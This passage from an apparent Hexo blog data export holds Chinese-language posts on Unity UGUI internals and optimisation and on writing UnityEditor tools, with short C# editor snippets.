编辑器里面搭建的UI,用于帮助工具,方便使用而创建的;有一套 GUI,已逐渐不再使用,就是在OnGui()函数里写的那些东西; IMGUI 则替代了GUI原来的作用：用于游戏调试和自定义Inspector面板,目前都使用 IMGUI;UI Element是 2019 版最新的 UI 系统,替代 IMGUI 而存在的;</li>\n<li>4 UGUI,NGUI,UI Element,IMGUI,GUI,UIWidgets,FGUI都可以使用,其中UGUI,NGUI,FGUI是一类,UI Element,IMGUI,GUI是一类,UIWidgets是一类;艹,耍我们就跟耍猴子一样,这么多 UI,UI 仔都不一定能全部了解.</li>\n</ul>\n<h1 id=\"RectTransform\"><a href=\"#RectTransform\" class=\"headerlink\" title=\"RectTransform\"></a>RectTransform</h1><ul>\n<li>1 Pivot 轴心的概念,在RectTransform的 Inspector 展示的效果里面,是一个小圆,在某一点上面的一个蓝色的圆,轴心是相对于当前控件本身的位置,轴心的位置会影响旋转、大小调整或缩放的结果.一般情况下,轴心是在矩形框内部的;但是也有在外部的情况,这种情况不好控制,一般是旋转使用.矩形旋转围绕的轴心点的位置，定义为矩形本身大小的一个比例。0,0 相当于左下角，而 1,1 相当于右上角。</li>\n<li>2 Anchors 锚点的概念,在RectTransform的 Inspector 展示的效果里面,是 4 个花瓣,4 个花瓣可以分开,也就是说,锚点有 4 个,锚点是相对于当前控件的父控件来描述其相对位置的.用来解决,父控件进行的变换,对子控件的影响,当父控件进行旋转、大小调整或缩放,子控件也相应的进行旋转、大小调整或缩放.</li>\n</ul>\n<h1 id=\"UGUI-的-C-层\"><a href=\"#UGUI-的-C-层\" class=\"headerlink\" title=\"UGUI 的 C++ 层\"></a>UGUI 的 C++ 层</h1><ul>\n<li>1 有些控件表面上是属于 UGUI 的,但是在 UGUI 的源码里面又找不到其核心代码,只是在 C# 层暴漏了接口.</li>\n<li>2 Canvas.cs CanvasGroup.cs CanvasRender.cs 在 UGUI 的源码里面都看不见其核心代码,Canvas里面的方法可能会在子线程中执行</li>\n</ul>\n<h1 id=\"UI整体介绍\"><a href=\"#UI整体介绍\" class=\"headerlink\" title=\"UI整体介绍\"></a>UI整体介绍</h1><ul>\n<li>1 可视化 UI : Text(文本),Image(图像),Raw Image(原始图像),Mask(遮罩);</li>\n<li>2 事件交互 UI : 按钮 (Button),开关 (Toggle),开关组 (Toggle Group),滑动条 (Slider),滚动条 (Scrollbar),下拉选单 (Dropdown),输入字段 (Input Field),滚动矩形/滚动视图 (Scroll Rect/Scroll View);</li>\n<li>3 自动布局:布局元素,Minimum width(最小宽度);Minimum height(最小高度);Preferred width(首选/偏好的宽度);Preferred height(首选/偏好的高度);Flexible width(灵活/最大的宽度);Flexible height(灵活/最大的高度); 布局组中的布局元素大小设置的基本原则如下:1)首先分配最小大小。2)如果有足够的可用空间，则分配偏好大小。3)如果有额外的可用空间，则分配灵活大小。布局元素组件(Layout Element),内容大小适配器 (Content Size Fitter),宽高比适配器 (Aspect Ratio Fitter)</li>\n<li>4 富文本</li>\n</ul>\n<h1 id=\"UGUI原理介绍\"><a href=\"#UGUI原理介绍\" class=\"headerlink\" title=\"UGUI原理介绍\"></a>UGUI原理介绍</h1><ul>\n<li><p>1 Canvas Batch: Canvas下的UI元素最终都会被Batch到同一个Mesh中，而在Batch前，会根据这些UI元素的材质（通常就是Atlas）以及渲染顺序进行重排，在不改变渲染结果的前提下，尽可能将相同材质的UI元素合并在同一个SubMesh中，从而把DrawCall降到最低。Batch的结果会被缓存复用，直到这个Canvas被标记为dirty。</p>\n</li>\n<li><p>2 影响合批的因素: Unity官方的重要提示：当给定Canvas上的任何可绘制UI元素发生更改时，Canvas必须重新执行合批过程。此过程重新分析Canvas上的每个可绘制UI元素，不管它是否被修改。注意，“更改”是指影响UI元素外观的任何变动，包括修改sprite renderer的sprite、transform的position和scale、文本网格的text等。</p>\n</li>\n<li><p>3 Canvas嵌套：Canvas可以嵌套使用，一个子Canvas下dirty的子物体不会触发父Canvas的rebuild。</p>\n</li>\n<li><p>4 UI顶点属性变化会引发网格更新:<br>修改Image、Text的color属性，会改变UIVertex.color;<br>修改RectTransform的Size、Anchors、Pivot等，会改变UIVertex.position;<br>注意：在UGUI中颜色的变化是通过修改顶点色实现的，避免生成了新的DrawCall;<br>注意：UIVertex.position记录的是本地空间下的坐标;            </p>\n</li>\n</ul>\n<hr>\n<p><img src=\"/2020/05/11/Unity/UGUI/%E4%BB%8B%E7%BB%8D/%E9%87%8D%E5%BB%BA%E6%B5%81%E7%A8%8B.png\" alt=\"重建流程\"></p>\n<ul>\n<li>1 该过程由CanvasUpdateRegistry监听Canvas的WillRenderCanvases（上图中1）而执行,主要是对当前标记为dirty的layout和graphic执行rebuild。</li>\n<li>2 在rebuild layout之前会对Layout rebuild queue中的元素依据它们在heiarchy中的层次进行排序（上图中的2），排列的结果是越靠近根的节点越会被优先处理。</li>\n<li>3 rebuild layout（上图中的3）,主要是执行ILayoutElement和ILayoutController接口中的方法来计算位置，Rect的大小等布局信息。</li>\n<li>4 rebulid graphic（上图中的4）,主要是调用UpdateGeometry重建网格的顶点数据（上图中5）以及调用UpdateMeterial更新CanvasRender的材质信息（上图中6）。</li>\n<li>5 为什么在rebuild layout的时候，要优先处理根节点的元素?</li>\n</ul>\n<hr>\n<p>合批原理            </p>\n<ul>\n<li>1 UGUI的合批规则是进行重叠检测，然后分层合并。</li>\n<li>2 第一步计算每个UI元素的层级号(类似于 NGUI 的 Depth)：如果有一个UI元素，它所占的矩形范围内，如果没有任何UI在它的底下，那么它的层级号就是0（最底下）；如果有一个UI在其底下且该UI可以和它Batch，那它的层级号与底下的UI层级一样；如果有一个UI在其底下但是无法与它Batch，那它的层级号为底下的UI的层级+1；如果有多个UI都在其下面，那么按前两种方式遍历计算所有的层级号，其中最大的那个作为自己的层级号。</li>\n<li>3 第二步合并相同层级中可以Batch的元素作为一个批次，并对批次进行排序 ：有了层级号之后，Unity会将每一层的所有元素进行一个排序（按照材质、纹理等信息），合并掉可以Batch的元素成为一个批次。经过以上排序，就可以得到一个有序的批次序列了。这时Unity会再做一个优化，即如果相邻间的两个批次正好可以Batch的话就会进行Batch。合批的Batch数据，最后会分别放在CanvasMesh的SubMesh里。</li>\n</ul>\n<h1 id=\"常见问题\"><a href=\"#常见问题\" class=\"headerlink\" title=\"常见问题\"></a>常见问题</h1><p>开发过程中四个常见的问题<br>过多的GPU片段着色器使用率（如屏幕填充率过高）<br>过多的CPU时间开销在重建一个画布上<br>过多的CPU时间开销在生成顶点上（通常是文本）<br>过多的画布重建次数      </p>\n<p>针对这四个问题来分组介绍优化策略<br>网格重建优化策略(优化 Mesh)        </p>\n<blockquote>\n<ul>\n<li>1 使用尽可能少的UI元素：在制作UI时，一定要仔细查检UI层级，删除不必要的UI元素，这样可以减少深度排序的时间以及Rebuild的时间。</li>\n<li>2 减少Rebuild的频率：将动态UI元素（频繁改变例如顶点、alpha、坐标和大小等的元素）与静态UI元素分离出来，放到特定的Canvas中。</li>\n<li>3 谨慎使用UI元素的active操作：因为它们会触发耗时较高的rebuild。使用 Scale 代替.</li>\n<li>4 谨慎使用Canvas的Pixel Perfect选项：该选项的开启会导致UI元素在发生位移时，其长宽会被进行微调（为了对齐像素），从而造成layout Rebuild。（比如ScrollRect滚动时，会使得Canvas.SendWillRenderCanvas消耗较高）</li>\n<li>5 Animator最佳用法： Animator每帧都会改变元素，即使动画中的数值没有变化，因为Animator没有空指令检查。对于仅响应事件时才变化的元素，可以自行编写代码或使用第三方补间插件。换成 DoTween</li>\n<li>6 谨慎用Tiled类型的Image</li>\n</ul>\n</blockquote>\n<p>屏幕填充率优化策略(OverDraw)      </p>\n<blockquote>\n<ul>\n<li>1 禁用不可见的面板：比如当打开一个系统时如果完全挡住了另外一个系统，则可以将被遮挡住的系统面板禁用。（龙与少女优化方案：通过修改Canvas对象的Layer隐藏面板。）</li>\n<li>2 不要使用空的Image做按键响应：在Unity中Raycast使用Graphic作为基本元素来检测touch。如果使用空的image也会产生不必要的overdraw。可以实现一个只在逻辑上响应Raycast但是不参与绘制的组件即可。使用网上的 Empty4Raycast 方案</li>\n<li>3 Polygon Mode Sprites：如果图片边缘有大片留白就会产生很多无用填充。Unity和Texture Packer目前都支持了Polygon Mode，也就是说将原来的矩形Sprite用更加紧致的Polygon来描述。</li>\n<li>4 Image Fill Center：在Image Type选项为Sliced的情况下，不需要Fill Center的时候去掉勾选。</li>\n</ul>\n</blockquote>\n<p>合批优化策略(DrawCall)        </p>\n<blockquote>\n<ul>\n<li>1 相同层级原则：父节点下所有子节点，尽量保持相同的层次结构。相同层级下的UI元素可以Batch.</li>\n<li>2 Mask组件：Mask组件使用了模版缓存，Mask中的UI元素无法与外界UI元素合批，Mask组件还会额外增加2个DrawCall.</li>\n<li>3 隐藏的Image：Image组件中sprite为空，都是占用drawcall渲染的，并且还会打断前后元素的合批。</li>\n<li>4 Screen Space-Camera模式：一个Canvas中的任何一个UI元素只要在屏幕中，则这个Canvas中的其他UI元素即使在屏幕外DrawCall仍不会减少。</li>\n<li>5 Hierarchy穿插重叠问题：如下图红点和Icon在不同图集中，如果红点稍微大一点，遮挡了旁边的Icon，就不能合批，须要调整Icon和红点的节点关系，4个Icons放在一个节点下，4个红点放在一个借点下。</li>\n</ul>\n</blockquote>\n<p>字体优化策略(Font)        </p>\n<blockquote>\n<ul>\n<li>1  字体图集的重建机制：当一个新文字出现的时候，会被添加到字体图集，如果图集已经没有空余的地方，那么图集会被重建。图集会以相同的尺寸重建，打包当前激活的所有UI text组件中要显示的文字，如果发现图集尺寸不够用的时候，图集会重新扩充尺寸。</li>\n<li>2 后备字体机制：对于字体库里没有的文字，会被放进后备字体图集里，后背字体图集会常驻内存里，不会被销毁。后备字体取自于系统自带的系统字库Arial.ttf，在发布的游戏安装包里该字库是不存在的。我们在一些Unity开发的游戏里，偶尔会发现一些生僻字的字形和其它常见文字的字形不统一。</li>\n<li>3 Text的网格重建：Text组件被重新启用的时候，会重建Text的网格。如果含有大量的文字，会造成严重的CPU开销。</li>\n<li>4 提前生成动态字体：准备游戏非常常用的文字集合，通过Font.RequestCharactersInTexture接口提前放入字体图集里。注意使用Font.textureRebuilt 委托，在字体图集被重新重建的时候，把我们提前准备的文字集合再次添加进去。</li>\n<li>5 使用美术数字：游戏的分数，可以使用美术数字（精灵图片）来代替Text组件</li>\n<li>6 谨慎使用Text的Best Fit选项：虽然这个选项可以动态的调整字体大小以适应UI布局而不会超框，但其代价是很高的，Unity会为用到的该元素所用到的所有字号生成图元保存在图集里，不但增加额外的生成时间，还会使得字体对应的图集变大。</li>\n<li>7 减少长文本Text的变动，慎用UI/Effect：描边和阴影效果都会增大四倍的顶点数</li>\n</ul>\n</blockquote>\n<p>滚动视图优化策划(ScrollView)        </p>\n<blockquote>\n<ul>\n<li>1  有两种方法填充滚动视图:用所有需要出现在滚动视图的元素填充滚动视图(子控件很少的情况下使用).用池处理这些元素，根据需要重新放置它们的位置(子控件很多,或者无限的情况下使用)</li>\n<li>2 RectMask2D组件：俩种方法可以通过给滚动视图添加一个RectMask2D组件来提高性能。该组件确保在滚动视图窗口外面的滚动视图元素不会出现在可画的元素列表中，省去了该元素的batch。</li>\n<li>3 一种简单的缓存池策略：在UI中布局中，使用带有Layout Element组件的对象占位（ Slot ）。给可见UI元素实例一个池，来填充滚动视图看可见区域，Slot作为父物体来定位。</li>\n<li>4 基于位置的缓存池策略：通过移动布局里UI元素的RectTransforms坐标值，来排序显示位置。通常写一个自定义的滚动视图类或者写一个自定义布局组的组件。</li>\n</ul>\n</blockquote>\n<p>其它优化策略        </p>\n<blockquote>\n<ul>\n<li>1 禁用无用的Raycast：UGUI的touch处理消耗也可能会成为性能热点。因为UGUI在默认情况下会对所有可见的Graphic组件调用raycast。对于不需要接收touch事件的grahic，一定要禁用raycast。（龙与少女为策划提供了检视的辅助脚本）</li>\n<li>2 OverrideSorting：子Canvas中的OverrideSorting属性将会造成Graphic Raycast测试停止遍历Transform层级。</li>\n<li>3 UI对象的坐标Z值：Z值不为零的时候会影响对象渲染顺序并不能合批。（例如：龙与少女里的阵型界面都是修改Spine的SortingOrder来实现位置排序）</li>\n<li>4 网格开销巨大：如果出现了WaitingForJob或PutGeometryJobFence，则说明合并网格开销巨大（子线程网格合并）</li>\n<li>5 高级技巧：对于处于选中播放动画的需求，并且所处canvas下内容比较多的情况下，可以单独把选中对象放到预先建好的动态canvas里，取消选中时再放回去。</li>\n<li>6 CanvasGroup的使用:在窗口的GameObject上添加一个CanvasGroup，通过控制它的Alpha值来淡入或淡出整个窗口;在窗口的GameObject上添加一个CanvasGroup，通过设置它Interactable值来控制底层所有控件的交互开关;在 UI 元素或其某个父元素上放置画布组 (Canvas Group) 组件并将其 Block Raycasts 属性设置为 false 来使一个或多个 UI 元素不阻止鼠标事件。</li>\n<li>7 使用 Profiler 以及 FrameDebug 检测</li>\n</ul>\n</blockquote>\n<h1 id=\"规范\"><a href=\"#规范\" class=\"headerlink\" title=\"规范\"></a>规范</h1><p>规范化的重要性：有规范就会有约束有限制，在一个团队的角度上来讲，大家遵守同一套规范，可以避免多余的沟通，增加开发效率，是保证团队协作、项目稳定推进的利器。</p>\n<p>设计模板：根据游戏风格和类型设计几套模板：尺寸(比如大中小三套)、布局(比如左右,左中右等)、样式(一级底+二级底+三级底)等，根据游戏内容选择模板，既保持UI统一，又能方便拼UI，大概百分之九十的窗口都在这几个模板中选择。其他比如充值等需要有表现力的窗口再自由设计尺寸和布局。</p>\n<p>路径一致性：美术UI目录和客户端目录保持一致，可以很方便替换新版UI，而不会出现名字不一致，目录不一致，策划找瞎眼的情况。</p>\n<p>图片命名：可以参考功能、颜色、尺寸等特点命名，命名尽量使用英文，可以添加前缀表示所属功能，后缀也可以使用拼音。</p>\n<p>公用图集：多个面板都会用到的图片放到公用图集里面。为了减少合批的障碍，有必要的时候，需要复制公共图片到单独的面板图集里。</p>\n<p>合理的出图尺寸：可以减小硬盘大小，减少第一次导入项目时的图片序列化时间。</p>\n<p>图片分类：图片可以根据用途分为UISprite、UIFrame 、 Icon、Photo、背景原画。<br>UISprite：尽量九宫格或者平铺，并且尽量复用。<br>UIFrame：是一些尺寸巨大的背景框。<br>Photo：英雄形象等大尺寸图片合并图集太大，因此不会打进图集。</p>\n<p>字体大小：研发过程中确立大中小几号字体。每级再分三类，一共九种字体大小。</p>\n<p>色值表：颜色可以由美术出一张色值表，包括一种颜色的RGBA值和16进制值，方便开发人员快速定位准确颜色。颜色值可以存储在unity的颜色模板里。</p>\n"},{"title":"1 介绍UnityEditor","date":"2020-05-11T03:41:32.000Z","top":1,"_content":"\n# 第一篇 UnityEditor\n\n\n* 1:编写游戏快捷工具,使游戏的产出更高效,包括不限于(可视化蓝图,打包流程,服务器辅助工具,音视频,优化等等)\n* 2:[官网](https://docs.unity3d.com/Manual),自行搜索unityeditor即可\n* 3:已知的UI编写方式有4种.第一种是运行时的UI.这个不再此讨论. ***第二种*** 是MonoBehaviour里面的特性Attribute编辑,可以在脚本的检视面板上面有较简单的展示,一般情况下足够使用了.\n ***第三种*** 就是当第二种的特性不满足了,需要在Editor里面单独写一个编辑脚本,这个时候需要自己进行布局排列,涉及到了EditorGUILayout/EditorGUI等的使用,使用 \n```\nCustomEditor(typeof(xxx)) \npublic class xxx:Editor{\n     //在这个里面进行布局操作\n     public override void OnInspectorGUI(){}\n}\n```\n ***第四种*** 就是自己生成一个window面板,编写一个类似动画状态机的工具让开发人员使用,开发比较复杂的工具时,比如行为树,是需要强大的数据结构作为支撑的,涉及到了GUI/GUILayout等的使用.这一点需要好好学习.\n```\npublic class xxx : EditorWindow \n{\n    //这个地方需要添加一个可以将这个window展示出来的标签\n    [MenuItem(\"Tools/Bug Reporter\")]\n    static void showWindow()\n    {\n        EditorWindow.GetWindow(typeof(xxx));\n    }\n    //在这个方法里面进行UI的展示操作\n    private void OnGUI()\n    {\n        \n    }\n}\n```\n\nEditorGUILayout与GUILayout区别基本区别就是EditorGUILayout每一个UI组件都有一个前缀名字,而GUILayout时没有的,要想提示更丰满一般采用EditorGUILayout,比如\n```\nGUILayout.TextField(\"bug name\");\nstring bugName;\nbugName = EditorGUILayout.TextField(\"bug name\", bugName);\n```\n\n---\n# 特殊文件夹\n\n\n* 1:Editor 文件夹 即项目路径: project/Assets/Editor,也可以随意在Assets/下面的任一文件夹下写入Editor/都会被unity识别\n* 2:Editor文件夹是为了使用编辑API的特别的文件夹。通常编辑API不能在运行时操作。\n* 3: Assembly-CSharp.dll 中不能 使用 UnityEditor.dll\n* 4:UnityEditor会被unity编译成Assembly-CSharp-Editor.dll\n* 5:在「Standard Assets」「Pro Standard Assets」「Plugins」生成Editor文件夹,则会被unity编译成 Assembly-CSharp-Editor-firstpass.dll 类库(一般不要使用)\n* 6:尽量让 Editor 的模块引用运行时模块代码,不要用运行时模块引用Editor模块代码\n* 7:如果不在Editor中编写的脚本想使用Editor模块的代码,需要使用unity的宏编译,使用了宏编译,运行时会自动将宏编译以及宏编译内的代码移除\n\n```\n    using UnityEngine;\n    #if UNITY_EDITOR\n    using UnityEditor;\n    #endif\n\n    public class NewBehaviourScript : MonoBehaviour\n    {\n        void OnEnable ()\n        {\n            #if UNITY_EDITOR\n            EditorWindow.GetWindow<ExampleWindow> ();\n            #endif\n        }\n}\n```\n\n* 8:Editor Default Resources 文件夹,存放只有Editor模块可以使用的资源,类似于Resources文件夹,可以使用如下代码快速获取assets资源,这个文件夹下的资源不会被运行时使用(***这里所有的运行时,同一指打包后的app使用的脚本或者资源***)\n\n```\n    var tex = EditorGUIUtility.Load (\"logo.png\") as Texture;\n```\n\n* 9:查看所有内置资源\n\n```\n        [MenuItem(\"Tools/Test1\")]\n        static void GetBultinAssetNames()\n        {\n            var flags = BindingFlags.Static | BindingFlags.NonPublic;\n            var info = typeof(EditorGUIUtility).GetMethod(\"GetEditorAssetBundle\", flags);\n            var bundle = info.Invoke(null, new object[0]) as AssetBundle;\n\n            foreach (var n in bundle.GetAllAssetNames())\n            {\n                Debug.Log(n);\n            }\n        }\n```\n\n\n---","source":"_posts/Unity/UnityEditor/1 介绍UnityEditor.md","raw":"---\ntitle: 1 介绍UnityEditor\ndate: 2020-05-11 11:41:32\ntop: 1\ncategories:\n- Unity\ntags:\n- UnityEditor\n---\n\n# 第一篇 UnityEditor\n\n\n* 1:编写游戏快捷工具,使游戏的产出更高效,包括不限于(可视化蓝图,打包流程,服务器辅助工具,音视频,优化等等)\n* 2:[官网](https://docs.unity3d.com/Manual),自行搜索unityeditor即可\n* 3:已知的UI编写方式有4种.第一种是运行时的UI.这个不再此讨论. ***第二种*** 是MonoBehaviour里面的特性Attribute编辑,可以在脚本的检视面板上面有较简单的展示,一般情况下足够使用了.\n ***第三种*** 就是当第二种的特性不满足了,需要在Editor里面单独写一个编辑脚本,这个时候需要自己进行布局排列,涉及到了EditorGUILayout/EditorGUI等的使用,使用 \n```\nCustomEditor(typeof(xxx)) \npublic class xxx:Editor{\n     //在这个里面进行布局操作\n     public override void OnInspectorGUI(){}\n}\n```\n ***第四种*** 就是自己生成一个window面板,编写一个类似动画状态机的工具让开发人员使用,开发比较复杂的工具时,比如行为树,是需要强大的数据结构作为支撑的,涉及到了GUI/GUILayout等的使用.这一点需要好好学习.\n```\npublic class xxx : EditorWindow \n{\n    //这个地方需要添加一个可以将这个window展示出来的标签\n    [MenuItem(\"Tools/Bug Reporter\")]\n    static void showWindow()\n    {\n        EditorWindow.GetWindow(typeof(xxx));\n    }\n    //在这个方法里面进行UI的展示操作\n    private void OnGUI()\n    {\n        \n    }\n}\n```\n\nEditorGUILayout与GUILayout区别基本区别就是EditorGUILayout每一个UI组件都有一个前缀名字,而GUILayout时没有的,要想提示更丰满一般采用EditorGUILayout,比如\n```\nGUILayout.TextField(\"bug name\");\nstring bugName;\nbugName = EditorGUILayout.TextField(\"bug name\", bugName);\n```\n\n---\n# 特殊文件夹\n\n\n* 1:Editor 文件夹 即项目路径: project/Assets/Editor,也可以随意在Assets/下面的任一文件夹下写入Editor/都会被unity识别\n* 2:Editor文件夹是为了使用编辑API的特别的文件夹。通常编辑API不能在运行时操作。\n* 3: Assembly-CSharp.dll 中不能 使用 UnityEditor.dll\n* 4:UnityEditor会被unity编译成Assembly-CSharp-Editor.dll\n* 5:在「Standard Assets」「Pro Standard Assets」「Plugins」生成Editor文件夹,则会被unity编译成 Assembly-CSharp-Editor-firstpass.dll 类库(一般不要使用)\n* 6:尽量让 Editor 的模块引用运行时模块代码,不要用运行时模块引用Editor模块代码\n* 7:如果不在Editor中编写的脚本想使用Editor模块的代码,需要使用unity的宏编译,使用了宏编译,运行时会自动将宏编译以及宏编译内的代码移除\n\n```\n    using UnityEngine;\n    #if UNITY_EDITOR\n    using UnityEditor;\n    #endif\n\n    public class NewBehaviourScript : MonoBehaviour\n    {\n        void OnEnable ()\n        {\n            #if UNITY_EDITOR\n            EditorWindow.GetWindow<ExampleWindow> ();\n            #endif\n        }\n}\n```\n\n* 8:Editor Default Resources 文件夹,存放只有Editor模块可以使用的资源,类似于Resources文件夹,可以使用如下代码快速获取assets资源,这个文件夹下的资源不会被运行时使用(***这里所有的运行时,同一指打包后的app使用的脚本或者资源***)\n\n```\n    var tex = EditorGUIUtility.Load (\"logo.png\") as Texture;\n```\n\n* 9:查看所有内置资源\n\n```\n        [MenuItem(\"Tools/Test1\")]\n        static void GetBultinAssetNames()\n        {\n            var flags = BindingFlags.Static | BindingFlags.NonPublic;\n            var info = typeof(EditorGUIUtility).GetMethod(\"GetEditorAssetBundle\", flags);\n            var bundle = info.Invoke(null, new object[0]) as AssetBundle;\n\n            foreach (var n in bundle.GetAllAssetNames())\n            {\n                Debug.Log(n);\n            }\n        }\n```\n\n\n---","slug":"Unity/UnityEditor/1 介绍UnityEditor","published":1,"updated":"2020-05-15T02:50:13.061Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0j004i2gk70bux8nmn","content":"<h1 id=\"第一篇-UnityEditor\"><a href=\"#第一篇-UnityEditor\" class=\"headerlink\" title=\"第一篇 UnityEditor\"></a>第一篇 UnityEditor</h1><ul>\n<li><p>1:编写游戏快捷工具,使游戏的产出更高效,包括不限于(可视化蓝图,打包流程,服务器辅助工具,音视频,优化等等)</p>\n</li>\n<li><p>2:<a href=\"https://docs.unity3d.com/Manual\" target=\"_blank\" rel=\"noopener\">官网</a>,自行搜索unityeditor即可</p>\n</li>\n<li><p>3:已知的UI编写方式有4种.第一种是运行时的UI.这个不再此讨论. <strong><em>第二种</em></strong> 是MonoBehaviour里面的特性Attribute编辑,可以在脚本的检视面板上面有较简单的展示,一般情况下足够使用了.<br><strong><em>第三种</em></strong> 就是当第二种的特性不满足了,需要在Editor里面单独写一个编辑脚本,这个时候需要自己进行布局排列,涉及到了EditorGUILayout/EditorGUI等的使用,使用 </p>\n<pre><code>CustomEditor(typeof(xxx)) \npublic class xxx:Editor{\n   //在这个里面进行布局操作\n   public override void OnInspectorGUI(){}\n}</code></pre><p><strong><em>第四种</em></strong> 就是自己生成一个window面板,编写一个类似动画状态机的工具让开发人员使用,开发比较复杂的工具时,比如行为树,是需要强大的数据结构作为支撑的,涉及到了GUI/GUILayout等的使用.这一点需要好好学习.</p>\n<pre><code>public class xxx : EditorWindow \n{\n  //这个地方需要添加一个可以将这个window展示出来的标签\n  [MenuItem(&quot;Tools/Bug Reporter&quot;)]\n  static void showWindow()\n  {\n      EditorWindow.GetWindow(typeof(xxx));\n  }\n  //在这个方法里面进行UI的展示操作\n  private void OnGUI()\n  {\n\n  }\n}</code></pre></li>\n</ul>\n<p>EditorGUILayout与GUILayout区别基本区别就是EditorGUILayout每一个UI组件都有一个前缀名字,而GUILayout时没有的,要想提示更丰满一般采用EditorGUILayout,比如</p>\n<pre><code>GUILayout.TextField(&quot;bug name&quot;);\nstring bugName;\nbugName = EditorGUILayout.TextField(&quot;bug name&quot;, bugName);</code></pre><hr>\n<h1 id=\"特殊文件夹\"><a href=\"#特殊文件夹\" class=\"headerlink\" title=\"特殊文件夹\"></a>特殊文件夹</h1><ul>\n<li>1:Editor 文件夹 即项目路径: project/Assets/Editor,也可以随意在Assets/下面的任一文件夹下写入Editor/都会被unity识别</li>\n<li>2:Editor文件夹是为了使用编辑API的特别的文件夹。通常编辑API不能在运行时操作。</li>\n<li>3: Assembly-CSharp.dll 中不能 使用 UnityEditor.dll</li>\n<li>4:UnityEditor会被unity编译成Assembly-CSharp-Editor.dll</li>\n<li>5:在「Standard Assets」「Pro Standard Assets」「Plugins」生成Editor文件夹,则会被unity编译成 Assembly-CSharp-Editor-firstpass.dll 类库(一般不要使用)</li>\n<li>6:尽量让 Editor 的模块引用运行时模块代码,不要用运行时模块引用Editor模块代码</li>\n<li>7:如果不在Editor中编写的脚本想使用Editor模块的代码,需要使用unity的宏编译,使用了宏编译,运行时会自动将宏编译以及宏编译内的代码移除</li>\n</ul>\n<pre><code>    using UnityEngine;\n    #if UNITY_EDITOR\n    using UnityEditor;\n    #endif\n\n    public class NewBehaviourScript : MonoBehaviour\n    {\n        void OnEnable ()\n        {\n            #if UNITY_EDITOR\n            EditorWindow.GetWindow&lt;ExampleWindow&gt; ();\n            #endif\n        }\n}</code></pre><ul>\n<li>8:Editor Default Resources 文件夹,存放只有Editor模块可以使用的资源,类似于Resources文件夹,可以使用如下代码快速获取assets资源,这个文件夹下的资源不会被运行时使用(<strong><em>这里所有的运行时,同一指打包后的app使用的脚本或者资源</em></strong>)</li>\n</ul>\n<pre><code>    var tex = EditorGUIUtility.Load (&quot;logo.png&quot;) as Texture;</code></pre><ul>\n<li>9:查看所有内置资源</li>\n</ul>\n<pre><code>        [MenuItem(&quot;Tools/Test1&quot;)]\n        static void GetBultinAssetNames()\n        {\n            var flags = BindingFlags.Static | BindingFlags.NonPublic;\n            var info = typeof(EditorGUIUtility).GetMethod(&quot;GetEditorAssetBundle&quot;, flags);\n            var bundle = info.Invoke(null, new object[0]) as AssetBundle;\n\n            foreach (var n in bundle.GetAllAssetNames())\n            {\n                Debug.Log(n);\n            }\n        }</code></pre><hr>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"第一篇-UnityEditor\"><a href=\"#第一篇-UnityEditor\" class=\"headerlink\" title=\"第一篇 UnityEditor\"></a>第一篇 UnityEditor</h1><ul>\n<li><p>1:编写游戏快捷工具,使游戏的产出更高效,包括不限于(可视化蓝图,打包流程,服务器辅助工具,音视频,优化等等)</p>\n</li>\n<li><p>2:<a href=\"https://docs.unity3d.com/Manual\" target=\"_blank\" rel=\"noopener\">官网</a>,自行搜索unityeditor即可</p>\n</li>\n<li><p>3:已知的UI编写方式有4种.第一种是运行时的UI.这个不再此讨论. <strong><em>第二种</em></strong> 是MonoBehaviour里面的特性Attribute编辑,可以在脚本的检视面板上面有较简单的展示,一般情况下足够使用了.<br><strong><em>第三种</em></strong> 就是当第二种的特性不满足了,需要在Editor里面单独写一个编辑脚本,这个时候需要自己进行布局排列,涉及到了EditorGUILayout/EditorGUI等的使用,使用 </p>\n<pre><code>CustomEditor(typeof(xxx)) \npublic class xxx:Editor{\n   //在这个里面进行布局操作\n   public override void OnInspectorGUI(){}\n}</code></pre><p><strong><em>第四种</em></strong> 就是自己生成一个window面板,编写一个类似动画状态机的工具让开发人员使用,开发比较复杂的工具时,比如行为树,是需要强大的数据结构作为支撑的,涉及到了GUI/GUILayout等的使用.这一点需要好好学习.</p>\n<pre><code>public class xxx : EditorWindow \n{\n  //这个地方需要添加一个可以将这个window展示出来的标签\n  [MenuItem(&quot;Tools/Bug Reporter&quot;)]\n  static void showWindow()\n  {\n      EditorWindow.GetWindow(typeof(xxx));\n  }\n  //在这个方法里面进行UI的展示操作\n  private void OnGUI()\n  {\n\n  }\n}</code></pre></li>\n</ul>\n<p>EditorGUILayout与GUILayout区别基本区别就是EditorGUILayout每一个UI组件都有一个前缀名字,而GUILayout时没有的,要想提示更丰满一般采用EditorGUILayout,比如</p>\n<pre><code>GUILayout.TextField(&quot;bug name&quot;);\nstring bugName;\nbugName = EditorGUILayout.TextField(&quot;bug name&quot;, bugName);</code></pre><hr>\n<h1 id=\"特殊文件夹\"><a href=\"#特殊文件夹\" class=\"headerlink\" title=\"特殊文件夹\"></a>特殊文件夹</h1><ul>\n<li>1:Editor 文件夹 即项目路径: project/Assets/Editor,也可以随意在Assets/下面的任一文件夹下写入Editor/都会被unity识别</li>\n<li>2:Editor文件夹是为了使用编辑API的特别的文件夹。通常编辑API不能在运行时操作。</li>\n<li>3: Assembly-CSharp.dll 中不能 使用 UnityEditor.dll</li>\n<li>4:UnityEditor会被unity编译成Assembly-CSharp-Editor.dll</li>\n<li>5:在「Standard Assets」「Pro Standard Assets」「Plugins」生成Editor文件夹,则会被unity编译成 Assembly-CSharp-Editor-firstpass.dll 类库(一般不要使用)</li>\n<li>6:尽量让 Editor 的模块引用运行时模块代码,不要用运行时模块引用Editor模块代码</li>\n<li>7:如果不在Editor中编写的脚本想使用Editor模块的代码,需要使用unity的宏编译,使用了宏编译,运行时会自动将宏编译以及宏编译内的代码移除</li>\n</ul>\n<pre><code>    using UnityEngine;\n    #if UNITY_EDITOR\n    using UnityEditor;\n    #endif\n\n    public class NewBehaviourScript : MonoBehaviour\n    {\n        void OnEnable ()\n        {\n            #if UNITY_EDITOR\n            EditorWindow.GetWindow&lt;ExampleWindow&gt; ();\n            #endif\n        }\n}</code></pre><ul>\n<li>8:Editor Default Resources 文件夹,存放只有Editor模块可以使用的资源,类似于Resources文件夹,可以使用如下代码快速获取assets资源,这个文件夹下的资源不会被运行时使用(<strong><em>这里所有的运行时,同一指打包后的app使用的脚本或者资源</em></strong>)</li>\n</ul>\n<pre><code>    var tex = EditorGUIUtility.Load (&quot;logo.png&quot;) 